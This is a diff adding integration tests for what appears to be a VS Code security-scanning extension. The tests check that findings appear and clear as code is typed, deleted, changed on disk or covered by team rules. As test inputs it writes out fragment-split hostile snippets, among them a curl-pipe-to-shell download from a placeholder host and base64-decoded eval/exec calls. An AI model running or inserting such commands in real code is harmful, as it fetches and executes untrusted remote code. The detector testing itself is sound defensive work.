@@ -75,9 +75,47 @@ async function steps() {
   await ed.edit(e => e.insert(new vscode.Position(1, 0), ["fetch('http://198.51", ".100.7/c');"].join("")));
   await until(() => ours(doc.uri).some(d => d.code === "raw-ip-url"), "flag while typing");
 
+  step("Removing the malicious code rescans at once, even with scanning while typing turned off");
+  await config().update("scanWhileTyping", false, vscode.ConfigurationTarget.Global);
+  const flaggedLine = doc.lineAt(1).rangeIncludingLineBreak;
+  await ed.edit(e => e.delete(flaggedLine));
+  await until(() => ours(doc.uri).length === 0, `cleared after the line was removed, have ${codes(doc.uri)}`, 3000);
+  await config().update("scanWhileTyping", undefined, vscode.ConfigurationTarget.Global);
+
+  step("The \"Delete line\" quick fix removes the code and rescans");
+  await ed.edit(e => e.insert(new vscode.Position(1, 0), ["ev", "al(at", "ob(p));\n"].join("")));
+  await until(() => ours(doc.uri).some(d => d.code === "eval-decoded"), "flag the new line");
+  const deleteFix = await until(async () => (await Promise.resolve(vscode.commands.executeCommand("vscode.executeCodeActionProvider", doc.uri, ours(doc.uri)[0].range)).catch(() => [])).find(a => a.title.startsWith("Delete line 2")), "the delete-line quick fix");
+  await vscode.workspace.applyEdit(deleteFix.edit);
+  assert.equal(await vscode.commands.executeCommand(deleteFix.command.command, ...deleteFix.command.arguments), 0, "the rescan finds nothing left");
+  assert.equal(doc.getText(), "let x = 1;\n");
+
+  step("Files created, changed and deleted outside the editor are rescanned");
+  const fs0 = require("node:fs");
+  const dropped = uri("dropped.py");
+  fs0.writeFileSync(dropped.fsPath, ["import os\nos.sys", "tem('cu", "rl -s http://x.test/a | s", "h')\n"].join(""));
+  await until(() => codes(dropped).includes("2:download-execute"), `a new file is checked, have ${codes(dropped)}`);
+  fs0.writeFileSync(dropped.fsPath, "print('hello')\n");
+  await until(() => ours(dropped).length === 0, "the cleaned file is rescanned");
+  fs0.writeFileSync(dropped.fsPath, ["ex", "ec(base64.b64de", "code(x))\n"].join(""));
+  await until(() => codes(dropped).includes("1:python-exec"), `flagged again, have ${codes(dropped)}`);
+  fs0.rmSync(dropped.fsPath);
+  await until(() => ours(dropped).length === 0, "a deleted file's findings are cleared");
+
+  step("Team settings in .veyra-guard.json apply custom rules in any language");
+  const php = uri("web/form.php");
+  fs0.mkdirSync(path.dirname(php.fsPath), { recursive: true });
+  fs0.writeFileSync(php.fsPath, "<?php mysql_query($q); ?>\n");
+  const phpDoc = await vscode.workspace.openTextDocument(php);
+  await vscode.window.showTextDocument(phpDoc);
+  fs0.writeFileSync(path.join(folder, ".veyra-guard.json"), JSON.stringify({ customRules: [{ id: "no-mysql-ext", pattern: "mysql_query", files: "*.php", severity: "medium" }] }));
+  await until(() => codes(php).join() === "1:no-mysql-ext", `custom rule applied, have ${codes(php)}`);
+  fs0.rmSync(path.join(folder, ".veyra-guard.json"));
+  await until(() => ours(php).length === 0, "removing the settings file removes the rule");
+
   step("The Code Guard panel opens, and hovers say how to fix");
   await vscode.commands.executeCommand("veyraGuard.findings.focus");
-  assert.match(ours(doc.uri).find(d => d.code === "raw-ip-url").message, /How to fix: Use your service/);
+  assert.match(ours(uri("client.py")).find(d => d.code === "raw-ip-url").message, /How to fix: Use your service/);
 
   step("A PDF security report is created");
   const reportUri = vscode.Uri.file(path.join(folder, "report.pdf"));
